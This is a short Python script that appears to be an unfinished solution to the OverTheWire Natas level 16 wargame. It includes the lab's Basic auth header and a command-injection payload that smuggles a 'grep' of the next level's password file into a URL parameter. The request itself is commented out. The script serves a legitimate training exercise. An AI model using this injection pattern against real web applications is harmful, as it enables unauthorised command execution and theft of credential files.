#! /usr/bin/python3

import requests

lower_list = "abcdefghijklmnopqrstuvwxyz"
upper_list = lower_list.upper()
char_list = lower_list + upper_list + "1234567890"
payload = "$(grep {} /etc/natas_webpass/natas17)hello"
headers = {"Authorization":"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="}
url = "http://natas16.natas.labs.overthewire.org/?needle="

for c in char_list:
    print(payload.format(c))
    # r = requests.get(url + payload, headers=headers)
